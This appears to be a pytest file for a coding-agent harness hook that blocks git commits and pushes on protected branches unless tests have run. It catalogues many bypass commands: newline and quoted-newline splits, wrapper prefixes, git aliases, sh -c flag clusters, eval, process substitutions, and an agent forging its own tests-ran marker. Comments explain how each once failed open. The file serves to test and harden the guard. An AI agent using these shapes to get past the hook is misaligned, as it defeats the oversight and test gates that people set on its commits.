_PREFIX_STRIP_TEST = "        if _ASSIGNMENT.match(head):"
# The quote-aware readings, which split a chained command as well: a mutant
# that drops the quote-blind splits drops them too, or they alone keep the
# chained commit denied.
_QUOTED_READING = (
    "    for text in (command,) if lexable == command else (command, lexable):\n"
    "        for tokens in _quoted_segments(text):\n"
    "            verbs |= _token_write_verbs(tokens, depth, scope) or set()\n"
)


def test_mutant_without_segment_split_allows_chained_commit(tmp_path: Path) -> None:
    """Twin: classify the whole chained command as ONE segment.

    Its leading token is `git`, but the subcommand in verb position is `add`,
    so the real commit is allowed and the deny above reds. This is what makes
    the per-segment split load-bearing rather than incidental. The quote-aware
    reading splits the command too, so it goes with the split.
    """
    mutant = _write_mutant_multi(
        tmp_path,
        "no_split",
        [
            (_SEGMENT_SPLIT, "    verbs |= _segment_write_verbs(command, depth, scope)"),
            (_QUOTED_READING, ""),
        ],
    )
    protected = _protected_repo(tmp_path)

    code, out = _run_mutant_hook(
        mutant, _bash_event(protected, "git add -A && git commit -m x"), protected
    )

    assert code == 0, "the chained-commit deny assertion must red without the split"
    assert out is None


def test_mutant_without_the_quoted_reading_allows_a_quoted_separator(tmp_path: Path) -> None:
    """Twin: drop the quote-aware reading and `git ci -m 'fix: a; b'` is allowed,
    since the quote-blind splits tear it into fragments that classify as
    nothing. This is what makes that reading load-bearing."""
    mutant = _write_mutant(tmp_path, "no_quoted_reading", _QUOTED_READING, "")
    protected = _protected_repo(tmp_path)
    command = "git ci -m 'fix: a; b'"

    code, out = _run_mutant_hook(mutant, _bash_event(protected, command), protected)
    assert code == 0, "without the quote-aware reading the quoted separator hides the subcommand"
    assert out is None

    code, out = _run_hook(_bash_event(protected, command), protected)
    assert code == 2


def test_mutant_unconditional_prefix_strip_allows_chained_commit(tmp_path: Path) -> None:
    """Second, independent twin for the same deny: drop the membership test on
    the leading-prefix strip, so `git` itself is consumed as if it were a
    prefix and no segment ever anchors."""
    mutant = _write_mutant(
        tmp_path, "strip_all", _PREFIX_STRIP_TEST, "        if True:"
    )
    protected = _protected_repo(tmp_path)

    code, out = _run_mutant_hook(
        mutant, _bash_event(protected, "git add -A && git commit -m x"), protected
    )

    assert code == 0, "an unconditional strip consumes the anchor and allows the commit"
    assert out is None


@pytest.mark.parametrize(
    "command",
    ["FOO=bar git commit -m x", "sudo git commit -m x"],
)
def test_assignment_and_sudo_prefixed_commit_denied(tmp_path: Path, command: str) -> None:
    """The strip exists to prevent a fail-open, not to create one.

    An assignment or wrapper prefix moves the anchor right; it does not excuse
    the command from the guard.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.mark.parametrize(
    "command",
    [
        "timeout 30 git commit -m x",
        "nice -n 10 git commit -m x",
        "sudo -u builder git commit -m x",
        "ionice -c2 git commit -m x",
        "stdbuf -oL git commit -m x",
        "env -i FOO=b git commit -m x",
        "sudo timeout 30 git push origin main",
    ],
)
def test_arg_taking_wrapper_prefixed_commit_denied(tmp_path: Path, command: str) -> None:
    """Wrappers that take their own operands are the real fail-open risk.

    Dropping exactly one token per wrapper would leave `30`, `10`, `builder`
    and friends in the leading position and wave every one of these through. A
    LISTED wrapper failing open is not part of the accepted residual, so each
    form is pinned here.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.mark.parametrize(
    "command",
    [
        "git -C /tmp/repo commit -m x",
        "git --no-pager commit -m x",
        'echo "$(git commit -m x)"',
        "echo `git commit -m x`",
    ],
)
def test_forms_that_still_reach_the_fail_closed_path_are_denied(
    tmp_path: Path, command: str
) -> None:
    """Anchoring must not open holes it did not have to.

    `git -C <path>` puts a path between the anchor and the verb, and a
    substitution runs a command the tokenizer cannot see at all; both stay
    denied (the first by skipping value-taking global options, the second by
    falling back to the legacy scan).
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


# ---------------------------------------------------------------------------
# A NEWLINE separates commands exactly as `;` does.
#
# Before this was in the split regex, a command whose first line was anything
# other than `git` classified as ONE segment with a non-git leading token, so
# `_git_writes` returned the empty set and main() took the `_allow()` short
# circuit at the top — bypassing the protected-branch, tests-ran-marker, marker
# freshness AND empty-index gates together. Multi-line Bash is ordinary, and
# `printf ok > .tests-ran-<story>` + commit is the exact shape the marker gate
# exists to forbid, so this was a total bypass rather than a corner case.
# ---------------------------------------------------------------------------

_NEWLINE_BYPASSES = [
    # the marker gate defeated by the story writing its own marker
    "printf ok > .tests-ran-1\ngit commit -m x",
    # the plain shape: any non-git first line
    'echo hi\ngit commit -m "x"',
    # CRLF-authored
    "echo hi\r\ngit commit -m x",
    # the verb on a later line still anchors that line
    "echo one\necho two\ngit push origin HEAD",
]


@pytest.mark.parametrize("command", _NEWLINE_BYPASSES)
def test_newline_separated_commit_is_classified(guard_module, command: str) -> None:
    """A commit/push on its own line is a git write like any other."""
    assert guard_module._git_writes(command), (
        f"newline-separated git write went unclassified: {command!r}"
    )


@pytest.mark.parametrize("command", _NEWLINE_BYPASSES)
def test_newline_split_removed_reopens_the_bypass(
    guard_module, monkeypatch, command: str
) -> None:
    """Twin: drop `\\n`/`\\r` from the separators and every shape above fails open.

    Driven by re-implementing `_command_write_verbs` over the OLD separator set
    rather than by editing a copy of the file, so the twin isolates the split
    itself. The ALLOW is the assertion: if these still classified without the
    newline alternative, the parametrize above would be proving nothing.
    """

    def old_split(cmd: str, depth: int) -> set:
        verbs: set = set()
        for segment in re.split(r"&&|\|\||;|\|", cmd):
            verbs |= guard_module._segment_write_verbs(segment, depth)
        return verbs

    monkeypatch.setattr(guard_module, "_command_write_verbs", old_split)

    assert guard_module._command_write_verbs(command, 0) == set(), (
        f"pre-fix code must fail open on {command!r}, else this is a vacuous test"
    )


def test_newline_bypass_denies_end_to_end(tmp_path: Path) -> None:
    """The bypass reached main(), so pin it there too, not just at the classifier.

    On a protected branch the first gate to fire is the protected-branch deny.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(
        _bash_event(protected, "printf ok > .tests-ran-1\ngit commit -m x"), protected
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_newline_split_does_not_deny_a_multi_line_mention(guard_module) -> None:
    """The split must not turn ordinary multi-line prose into a deny.

    A line is only a git write when `git` leads it, so a mention sitting mid-line
    stays allowed. This is the fail-open direction's counterweight: the newline
    alternative widens what is CLASSIFIED, never what is matched inside a line.

    The probe deliberately carries BOTH words on a mid-line, and carries them in
    a line that also contains `git`, so it cannot pass merely by lacking a token
    to match — an earlier draft omitted `git` entirely and could never have
    failed.
    """
    mention = "echo one\necho 'we ran git commit already'\necho two"
    assert "git" in mention and "commit" in mention, "probe must contain both tokens"
    assert guard_module._git_writes(mention) == set()


# ---------------------------------------------------------------------------
# A newline INSIDE a quoted argument is not a separator.
#
# The newline split is quote-blind, so on its own it tears
# `git -c foo.bar="a<NL>b" commit -m x` into `git -c foo.bar="a` and
# `b" commit -m x`. Each fragment has unbalanced quotes, so `_tokenize` raises
# and each falls back to `_anywhere_write_verbs` — whose regex is newline-bounded
# (`[^\n;&|]*?`) and therefore cannot span the tear either. `git` sits in one
# fragment and the verb in the other, so BOTH detection paths miss and a real
# commit is allowed.
#
# Classifying under both separator sets and unioning is what closes this: the
# separator-only pass keeps the command whole, where `shlex` balances the quotes
# and the verb anchors normally. Every case below must therefore deny.
# ---------------------------------------------------------------------------

_QUOTED_NEWLINE_WRITES = [
    'git -c foo.bar="a\nb" commit -m x',
    'git -c foo.bar="a\nb" push origin HEAD',
    'git -C "/tmp/a\nb" commit -m x',
    'git --git-dir="a\nb" commit -m x',
    'git --work-tree="a\nb" commit -m x',
    'git -c foo.bar="a\rb" commit -m x',
    'sh -c \'git -c foo.bar="a\nb" commit -m x\'',
    # the ordinary multi-line commit message, which must not regress either
    'git commit -m "line one\nline two"',
]


@pytest.mark.parametrize("command", _QUOTED_NEWLINE_WRITES)
def test_newline_inside_a_quoted_argument_still_classifies(
    guard_module, command: str
) -> None:
    assert guard_module._git_writes(command), (
        f"a real git write was allowed through: {command!r}"
    )


@pytest.mark.parametrize("command", _QUOTED_NEWLINE_WRITES[:6])
def test_newline_only_split_would_fail_open(guard_module, monkeypatch, command: str) -> None:
    """Twin: split on the newline set ALONE and these real writes are allowed.

    This is the regression that shipping the newline alternative on its own
    introduced, pinned so the union cannot be simplified back into it.
    """

    def newline_only(cmd: str, depth: int) -> set:
        verbs: set = set()
        for segment in re.split(r"&&|\|\||;|\||\n|\r", cmd):
            verbs |= guard_module._segment_write_verbs(segment, depth)
        return verbs

    monkeypatch.setattr(guard_module, "_command_write_verbs", newline_only)

    assert guard_module._command_write_verbs(command, 0) == set(), (
        f"newline-only split must fail open on {command!r}, else this is vacuous"
    )


def test_quoted_newline_commit_denies_end_to_end(tmp_path: Path) -> None:
    """The fail-open reached main() and landed a real commit, so pin it there."""
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(
        _bash_event(protected, 'git -c foo.bar="a\nb" commit -m x'), protected
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_union_is_a_superset_of_the_separator_only_classification(guard_module) -> None:
    """The property the union exists to guarantee, asserted directly.

    Whatever the pre-newline separator set detected, the shipped classifier must
    still detect. Stated as a property over every shape this file exercises, so a
    future narrowing of either pass reds here rather than in one hand-picked case.
    """

    def separator_only(cmd: str) -> set:
        verbs: set = set()
        for segment in re.split(r"&&|\|\||;|\|", cmd):
            verbs |= guard_module._segment_write_verbs(segment, 0)
        return verbs

    for command in _QUOTED_NEWLINE_WRITES + _NEWLINE_BYPASSES + [
        "git commit -m x",
        "git add -A && git commit -m x",
        "FOO=bar git commit -m x",
        "sudo git commit -m x",
        _ECHO_MENTION,
    ]:
        assert separator_only(command) <= guard_module._git_writes(command), (
            f"the shipped classifier detects LESS than the separator-only pass "
            f"on {command!r}: that is a fail-open regression"
        )


def test_wrapper_strip_removed_allows_env_prefixed_commit(guard_module, monkeypatch) -> None:
    """Twin: remove the assignment/wrapper strip and the prefixed commits pass.

    Driven against the imported module rather than a hand-edited copy of the
    live guard. The plain form still classifies as a commit under the same
    mutation, so this proves the STRIP is what catches the prefixed forms, not
    a classifier that happens to allow (or deny) everything.
    """
    prefixed = ["FOO=bar git commit -m x", "sudo git commit -m x"]
    for command in prefixed:
        assert guard_module._git_writes(command) == {"commit"}, command

    monkeypatch.setattr(guard_module, "_EXEC_WRAPPERS", frozenset())
    monkeypatch.setattr(guard_module, "_ASSIGNMENT", re.compile(r"(?!)"))

    for command in prefixed:
        assert guard_module._git_writes(command) == set(), (
            f"without the strip, {command!r} must slip through: that is the "
            "fail-open the strip exists to prevent"
        )
    assert guard_module._git_writes("git commit -m x") == {"commit"}, (
        "the unprefixed form is untouched by the mutation, so the twin isolates "
        "the strip rather than disabling the guard wholesale"
    )


def test_unlisted_wrapper_is_an_accepted_fail_open(guard_module, monkeypatch) -> None:
    """Documented residual: a wrapper the list does not name is allowed through.

    An unlisted wrapper leaves a non-`git` leading token, so the segment is not
    classified as a git write. This is accepted rather than fixed, because the
    alternative (treat any unknown leading token as a possible wrapper and scan
    on) re-creates the matches-anywhere false positives this anchoring removes.

    Two compensating nets stand behind the residual:
      1. the tests-ran marker — a commit still needs a verified-green marker on
         disk for the current story, which no wrapper prefix can conjure; and
      2. the remote's branch protection — nothing reaches a protected branch
         without review, whatever the local guard let past.

    `timeout` stands in for an unlisted wrapper by being dropped from the list
    for this test only. In shipped state it IS listed and the same shape denies:
    that pole is held by test_arg_taking_wrapper_prefixed_commit_denied, and by
    the shipped-state assertion below.
    """
    command = "timeout git commit -m x"
    assert guard_module._git_writes(command) == {"commit"}, (
        "shipped state: `timeout` is a listed wrapper, so this denies"
    )

    monkeypatch.setattr(
        guard_module, "_EXEC_WRAPPERS", guard_module._EXEC_WRAPPERS - {"timeout"}
    )

    assert guard_module._git_writes(command) == set(), (
        "accepted residual: an unlisted wrapper passes the guard. Compensating "
        "nets: the tests-ran marker (no commit without a verified-green story "
        "marker) and the remote's branch protection (nothing lands on a "
        "protected branch unreviewed)."
    )


def _assert_protected_deny(protected: Path, command: str, env: dict | None = None) -> str:
    code, out = _run_hook(_bash_event(protected, command), protected, env)
    assert code == 2, command
    reason = out["hookSpecificOutput"]["permissionDecisionReason"]
    assert "Protected-branch" in reason, command
    return reason


def _assert_no_deny(protected: Path, command: str, env: dict | None = None) -> None:
    code, out = _run_hook(_bash_event(protected, command), protected, env)
    assert code == 0, command
    assert out is None or out["hookSpecificOutput"]["permissionDecision"] != "deny", command


@pytest.mark.parametrize(
    ("aliases", "command"),
    [
        ({"ci": "commit"}, "git ci -m x"),
        ({"ci": "commit"}, "git CI -m x"),
        ({"log": "commit -m x"}, "git LOG"),
        ({"ci": "commit -v"}, "git add -A && git ci -m x"),
        ({"pu": "push origin HEAD"}, "git pu"),
        ({"ci": "commit", "c2": "ci"}, "git c2 -m x"),
        ({"p": "!git push origin HEAD"}, "git p"),
        ({"sync": '!f() { git add -A; git commit -m "$1"; }; f'}, "git sync wip"),
        ({"ci": "-c user.name=x commit"}, "git ci -m x"),
    ],
)
def test_a_git_alias_to_commit_or_push_is_denied(
    tmp_path: Path, aliases: dict, command: str
) -> None:
    """`git ci` with `alias.ci = commit` is a commit, whatever the command spells.

    The guard matched the subcommand word, so an alias reached `git commit` and
    `git push` past every gate. It now counts any subcommand git does not run
    before an alias as both verbs, without reading what the alias runs. Git
    matches its own command names case-sensitively, so `git LOG` runs
    `alias.log` and counts too.
    """
    protected = _protected_repo(tmp_path)
    for name, value in aliases.items():
        _git(protected, "config", f"alias.{name}", value)

    _assert_protected_deny(protected, command)


@pytest.mark.parametrize(
    "command",
    [
        # What a lookup at hook time would have read wrong: the alias defined,
        # included or moved before git runs, or read in another repository.
        "git config alias.ci commit; git ci -m x",
        "printf '[alias]\\\\n ci = commit' >> .git/config; git ci -m x",
        "git config include.path /tmp/aliases && git ci -m x",
        "cd ../other && git ci -m x",
        "HOME=/tmp/h git ci -m x",
        "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.ci GIT_CONFIG_VALUE_0=commit git ci",
        "env -C ../other git ci",
        "sudo -D ../other git ci",
        "git -C ../other ci",
        "git -c alias.zz=commit -c 'alias.x=!git zz' x",
        # Where the classification never reached the subcommand.
        "git ci -m 'fix: a; b'",
        "git ci -m 'a && b'",
        "git ci -m 'x | y'",
        'git ci -m "$(date)"',
        "echo $(git -C repo ci)",
        'echo "$(git ci)"',
        "x=`git ci`",
        'echo "run `git ci` now"',
        "git --attr-source HEAD commit -m x",
        # PATH or the exec-path moved where only a nested shell shows it, so an
        # external or script command proves nothing; the guard asks neither.
        "sh -c 'env PATH=/nonexistent /usr/bin/git zzfoo'",
        'bash -c "env -i git zzfoo"',
        "sh -c 'sudo git zzfoo'",
        "eval 'PATH=/x git zzfoo'",
        "git --exec-path=/x submodule status",
        "GIT_EXEC_PATH=/x git submodule status",
        "exec git ci",
        # An external command, which may as well be an alias of its name.
        "git lfs pull",
        # Read as bash reads them: a newline ends a segment, `#` inside a word
        # starts no comment, and a function definition's body is a command.
        "true\ngit ci -m 'fix: a; b'",
        "echo issue#1; git ci -m 'fix: a; b'",
        "f() { git commit -m x; }; f",
        "f(){ git ci -m 'a; b'; }; f",
        # A built-in that runs a git subcommand of its own.
        "git -c x.repo=. for-each-repo --config=x.repo commit -m x",
        "git for-each-repo --config=maintenance.repo ci",
        # `eval` behind a wrapper.
        'time eval "git commit -m x"',
        'command eval "git commit -m x"',
        'sudo -u root eval "git ci"',
        'builtin eval "git commit -m x"',
        # What shlex reads unlike bash, taken out before the quote-aware
        # reading: a comment holding an apostrophe, an ANSI-C string, a heredoc
        # body holding one.
        "git ci -m wip  # it's the fix",
        """git ci -m "fix: a; b"  # it's staged""",
        "git ci -m $'fix: it\\'s done'",
        "cat <<EOF\nit's here\nEOF\ngit ci -m 'a; b'",
        # `eval --`, a function's or coprocess's name, a leading redirection.
        'eval -- "git commit -m x"',
        "eval -- git ci -m x",
        "function f { git commit -m x; }; f",
        "coproc c { git commit -m x; }",
        ">/dev/null git commit -m x",
        "2>&1 git commit -m x",
        "> out git ci",
        # A value option the subcommand search must skip.
        "git --shallow-file log commit -m x",
        # A body read at the depth cap first, then more shallowly.
        "echo $(echo $(echo $(echo `sh -c 'git ci -m x'`))); echo `sh -c 'git ci -m x'`",
        # A control operator glued to a process substitution in one shlex
        # token, and a process substitution's body.
        "true;>(git ci -m x)",
        "true;>(git commit -m x)",
        "true\n>(git ci -m x)",
        "echo hi|>(git ci -m x)",
        "true;<(git ci -m 'a;b')",
        "true&&>(git ci -m x)",
        "false||>(git ci -m x)",
        "(true)>(git ci -m x)",
        # Where _lexable's reading misreads, the command as it is still reads.
        "echo ${x:- #}; git ci -m 'a;b'",
        "x=`echo a #`; git ci -m 'a;b'",
        """echo "$(echo " #")"; git ci -m 'a;b'""",
        "echo $(date)#x; git ci -m 'a;b'",
        "echo $((1<<n))\ngit ci -m 'a;b'",
        'echo $(( 1 << bits ))\ngit ci -m "subject\n\nbody"',
        """cat <<E"O"F\nhello\nEOF\ngit ci -m 'a;b'""",
        "cat <<EOF-x\nhello\nEOF-x\ngit ci -m 'a;b'",
        'cat <<END.\nhello\nEND.\ngit ci -m "subject\n\nbody"',
        "cat <<EOF\nit's\n\tEOF\nit's\nEOF\ngit ci -m 'a;b'",
        "echo a \\\n# see <<EOF\ngit ci -m 'a;b'",
        "echo $$'a\\' ; git ci -m 'b;c'",
        # A quoted punctuation word is a word, not an operator.
        "git --namespace ')>' ci -m 'a;b'",
        "exec -a ')>' git ci -m 'a;b'",
        # A comment or heredoc with an apostrophe the command as it is cannot
        # be lexed past, read by the _lexable reading beside it.
        "out=x; grep -q x <<<\"$out\" # it's there\ngit -c user.name='Bot; CI' commit -m m",
        "branch=main; grep -q main <<<\"$branch\" # it's the default\ngit ci -m 'fix: a; b'",
        # An apostrophe in a trailing comment leaves a segment no tokens; it is
        # read once more without its comments and line continuations.
        "git ci -m m \\\n# it's",
        "echo $$'a\\' ; git ci -m m # it's",
        "true \\\n# it's\ngit ci -m m",
        "echo ${x#*} ; git ci -m m # it's",
        "echo $(( 1<<2 )) ; git ci -m m # it's",
        # An output process substitution's body, read as a command.
        "echo x > >(git ci -m m) # it's",
        "echo x > >(git ci -m m) \\\n# it's",
        "git log > >(git ci -m m)",
        # Past the depth cap, a git the guard cannot read deeper.
        "echo $(echo $(echo $(echo `sh -c 'git ci -m x'`)))",
        "sh -c \"sh -c 'sh -c \\\"sh -c \\\\\\\"git ci\\\\\\\"\\\"'\"",
    ],
)
def test_a_subcommand_that_is_not_gits_own_counts_as_a_write(tmp_path: Path, command: str) -> None:
    """No configuration is read, so none can be read wrong.

    Three review rounds found a lookup at hook time reading the wrong
    configuration (an earlier segment, `-C`/`-c`, a wrapper's directory, the
    environment) or never reached (a quoted separator, a substitution, a value
    option misread as the subcommand). Each of these forms now counts as both
    verbs, with no alias defined on disk at all.
    """
    protected = _protected_repo(tmp_path)

    _assert_protected_deny(protected, command)


def test_a_deny_names_the_subcommand_and_says_what_to_run(tmp_path: Path) -> None:
    """A read-only alias is gated too, so the deny says why and what to do."""
    protected = _protected_repo(tmp_path)
    _git(protected, "config", "alias.st", "status")

    reason = _assert_protected_deny(protected, "git st")

    assert "this command runs `git st`, which is not one of git's built-in commands" in reason
    assert "run the git command an alias stands for" in reason
    assert "`git-lfs pull` for `git lfs pull`" in reason


def test_a_deny_for_a_literal_commit_carries_no_alias_hint(tmp_path: Path) -> None:
    protected = _protected_repo(tmp_path)

    reason = _assert_protected_deny(protected, "git commit -m x")

    assert "Note: this command runs" not in reason


def test_the_hint_quotes_only_name_shaped_subcommands(guard_module) -> None:
    """A fragment torn from a quoted argument never reaches a deny's text, and a
    name met in four readings is listed once."""
    assert guard_module._classify("git 'x y'") == ({"commit", "push"}, [])
    assert guard_module._classify("sh -c 'git zzfoo'") == ({"commit", "push"}, ["zzfoo"])
    assert guard_module._classify('git zz && echo "$(git zz)" `git zz`')[1] == ["zz"]


@pytest.mark.parametrize(
    "command",
    [
        "git status",
        "git -C . status",
        "git --no-pager log -1",
        "cd sub && git status && echo ok",
        "git maintenance run",
        'git log --format="%h $(date)"',
        "npm test && git status --porcelain",
        "GIT_PAGER=cat git log -1",
        "LC_ALL=C git status",
        "git submodule status",
        "echo 'run `git ci` later'",
        "git-lfs pull",
        # `--attr-source` takes a separate value, which is not the subcommand.
        "git --attr-source HEAD log -1",
        "git status # a note that names commit",
        "git status # it's fine",
        "git log -1 2>&1 | cat",
        "git status >/dev/null 2>&1",
        "git log --oneline | head -5 # it's fine",
        "git diff >| out.txt",
        "diff <(git show HEAD:a) a",
        # A process substitution after a read, whose words name a verb.
        "git log --grep=push > >(cat)",
        "git status > >(tee log.txt)  # then commit",
        "git rev-parse HEAD > >(tee last-commit.txt)",
        "git status > >(cat) # it's fine",
    ],
)
def test_gits_own_commands_stay_reads(tmp_path: Path, command: str) -> None:
    protected = _protected_repo(tmp_path)
    # Git ignores an alias named like one of its own commands.
    _git(protected, "config", "alias.status", "commit")

    _assert_no_deny(protected, command)


def test_an_external_git_command_counts_as_a_write_and_runs_by_its_own_name(
    tmp_path: Path,
) -> None:
    """Git runs `git-<name>` before an alias of the name only when it finds it
    on PATH, which can differ between this hook and the shell, or change inside
    the command, so `git frob` counts as both verbs even with a `git-frob` on
    the hook's PATH. The deny says to run it as `git-frob`, which is no git
    subcommand at all."""
    protected = _protected_repo(tmp_path)
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    script = bin_dir / "git-frob"
    script.write_text("#!/bin/sh\necho frob\n", encoding="utf-8")
    script.chmod(0o755)
    env = {"PATH": str(bin_dir) + os.pathsep + os.environ.get("PATH", "")}

    reason = _assert_protected_deny(protected, "git frob", env)
    assert "`git frob`" in reason and "by its own name" in reason

    _assert_no_deny(protected, "git-frob --help", env)


def test_every_listed_git_command_is_one_git_knows(guard_module) -> None:
    """A name on _GIT_COMMANDS is cleared with no lookup, so it must be a
    built-in, which git runs before any alias whatever PATH says; a name on
    _GIT_SCRIPT_COMMANDS must be one git ships in its exec-path. Listing a
    name this git does not have would wave an alias of that name through."""

    def listed(kind: str) -> set[str]:
        out = subprocess.run(
            ["git", f"--list-cmds={kind}"], capture_output=True, text=True, check=True
        )
        return set(out.stdout.split())

    assert sorted(guard_module._GIT_COMMANDS - listed("builtins")) == []
    assert sorted(guard_module._GIT_SCRIPT_COMMANDS - listed("main")) == []


@pytest.mark.parametrize(
    "command",
    ["sh -c 'git commit -m x'", 'bash -c "git commit -m x"'],
)
def test_shell_dash_c_payload_commit_denied(tmp_path: Path, command: str) -> None:
    """The `-c` string payload is re-entered as a command in its own right."""
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_dash_c_recursion_disabled_allows_payload_commit(guard_module, monkeypatch) -> None:
    """Twin: with no shell recognized, nothing recurses into the `-c` payload
    and the same commit is allowed, so the deny above reds."""
    command = "sh -c 'git commit -m x'"
    assert guard_module._git_writes(command) == {"commit"}

    monkeypatch.setattr(guard_module, "_SHELL_WRAPPERS", frozenset())

    assert guard_module._git_writes(command) == set(), (
        "without the recursion the payload is just an opaque argument word"
    )
    assert guard_module._git_writes("git commit -m x") == {"commit"}, (
        "and the direct form is unaffected: the twin removes the recursion only"
    )


@pytest.mark.parametrize(
    "command",
    [
        "bash -lc 'git commit -m x'",
        'sh -lc "git commit -m x"',
        "bash -cx 'git commit -m x'",
        "bash -xc 'git commit -m x'",
        "zsh -ic 'git push'",
        "bash -ec 'git push --force'",
        "dash -lc 'git push'",
        "timeout 30 bash -lc 'git commit -m x'",
    ],
)
def test_shell_flag_cluster_payload_commit_denied(tmp_path: Path, command: str) -> None:
    """A combined flag cluster carrying `-c` still locates the payload.

    Matching only the bare `-c` token was a fail-open: every form here located
    no payload, returned an empty verb set, and took the allow path BEFORE the
    protected-branch, tests-ran, marker-freshness and empty-index gates — the
    whole commit gate, skipped by one extra letter in the flag.

    The `c` is matched anywhere in the cluster because the shells treat it
    positionally-indifferently: `bash -cx` and `bash -xc` both run the next
    token (verified against bash, sh and dash, not assumed).
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_unlocatable_shell_payload_falls_back_rather_than_allowing(guard_module) -> None:
    """A listed wrapper whose payload cannot be found fails CLOSED.

    `_shell_payload_verbs` returns None (not an empty set) so the caller scans
    the raw segment instead of reading "no payload found" as "no git write
    here". A LISTED wrapper failing open is not part of the accepted residual —
    that allowance covers UNLISTED wrappers only (see
    test_unlisted_wrapper_is_an_accepted_fail_open).
    """
    assert guard_module._shell_payload_verbs(["-lc"], 0) is None, (
        "no operand after the flag: unlocatable, not clean"
    )
    assert guard_module._shell_payload_verbs(["-x", "-v"], 0) is None, (
        "no payload flag at all: unlocatable, not clean"
    )
    # Reached through the real entry point, the None becomes the anywhere-scan.
    assert guard_module._git_writes("bash -x git commit -m x") == {"commit"}


def test_flag_cluster_match_excludes_long_options(guard_module) -> None:
    """`--login` must not read as a payload flag, or the operand after a long
    option would be mistaken for the command string."""
    assert not guard_module._PAYLOAD_FLAG.match("--login")
    assert not guard_module._PAYLOAD_FLAG.match("-i")
    assert guard_module._PAYLOAD_FLAG.match("-c")
    assert guard_module._PAYLOAD_FLAG.match("-lc")
    assert guard_module._PAYLOAD_FLAG.match("-cx")
    # The real form still routes past the long option to the actual `-c`.
    assert guard_module._git_writes("bash --login -c 'git push'") == {"push"}


def test_flag_cluster_fix_removed_restores_the_bypass(guard_module, monkeypatch) -> None:
    """Twin: the hole reopens only when BOTH halves of the fix are removed.

    The two halves are deliberately redundant, which this pins rather than
    glosses. Narrowing the matcher alone does not restore the bypass, because
    an unlocatable payload now falls back to the anywhere-scan; disabling the
    fallback alone does not restore it either, because the matcher locates the
    payload. Each half independently denies the commit, and only removing both
    reproduces the original fail-open.
    """
    import re as _re

    bypass = "bash -lc 'git commit -m x'"
    bare_matcher = _re.compile(r"^-c$")
    assert guard_module._git_writes(bypass) == {"commit"}

    # Half 1 alone: matcher narrowed, fallback intact -> still denied.
    with monkeypatch.context() as m:
        m.setattr(guard_module, "_PAYLOAD_FLAG", bare_matcher)
        assert guard_module._git_writes(bypass) == {"commit"}, (
            "the fail-closed fallback catches what the matcher missed"
        )

    # Half 2 alone: fallback neutered, matcher intact -> still denied.
    with monkeypatch.context() as m:
        m.setattr(guard_module, "_anywhere_write_verbs", lambda segment: set())
        assert guard_module._git_writes(bypass) == {"commit"}, (
            "the cluster matcher locates the payload without needing the fallback"
        )

    # Both removed: the original bypass is back, which is what the fix closes.
    monkeypatch.setattr(guard_module, "_PAYLOAD_FLAG", bare_matcher)
    monkeypatch.setattr(guard_module, "_anywhere_write_verbs", lambda segment: set())
    assert guard_module._git_writes(bypass) == set(), (
        "with neither half, the cluster form locates no payload and the empty "
        "set is what waved a real commit past every gate"
    )
    assert guard_module._git_writes("bash -c 'git commit -m x'") == {"commit"}, (
        "and the bare form is unaffected: the twin narrows the matcher only"
    )


def test_dash_c_payload_split_mid_quote_still_denies(tmp_path: Path) -> None:
    """The segment split runs BEFORE the `-c` recursion, so a chained payload is
    cut mid-quote into `sh -c 'git add -A` and `git commit'`.

    Neither fragment tokenizes cleanly, so both take the fail-closed fallback
    and the second one still reports the verb. Verified rather than assumed.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(
        _bash_event(protected, "sh -c 'git add -A && git commit -m x'"), protected
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


# ---------------------------------------------------------------------------
# Writer side: the two places execute.md tells a story to write the marker.
#
# The reader above only refuses a marker that does not name the story's
# baseline; something has to tell the writer to put the line there in the first
# place, at BOTH marker-write sites. Step 2 writes the marker at green; step 5
# writes a FRESH one when the post-commit re-verify comes back red — and a
# step-5 marker without the line means a story that legitimately needs
# remediation can never re-commit.
#
# ONE matcher is applied to both blocks, so each twin can red its own site while
# the same matcher stays green on the other. Without that pairing, a matcher
# that scanned the whole file would satisfy the step-5 check off step 2's
# sentence and prove nothing about the second site.
#
# Stated limit: this is a presence proof over prose. It shows the instruction is
# in the file, not that an executor obeys it; the behavioral proof is the reader
# section above, against the real hook.
# ---------------------------------------------------------------------------

_EXECUTE_MD = Path(__file__).resolve().parents[2] / "references" / "execute.md"

# The marker-format rule: the `baseline=<sha>` line, the file it is copied FROM,
# and the copied-not-recomputed obligation, in that order and co-located.
_BASELINE_LINE_RE = re.compile(
    r"`baseline=<sha>` line"
    r".{0,400}?`\{workflow\.implementation_artifacts\}/\.baseline-<story_id>`"
    r".{0,400}?copied, never re-derived from `git rev-parse HEAD`",
    re.DOTALL,
)

# Each site's added sentence, anchored so a twin's removal is surgical.
_STEP2_BASELINE_SENTENCE_RE = re.compile(
    r"\*\*That marker must carry a `baseline=<sha>` line\*\*"
    r".*?denies the story's own second commit\.",
    re.DOTALL,
)
_STEP5_BASELINE_SENTENCE_RE = re.compile(
    r"\*\*That fresh marker carries the same `baseline=<sha>` line as step 2's\*\*"
    r".*?could never close\. ",
    re.DOTALL,
)


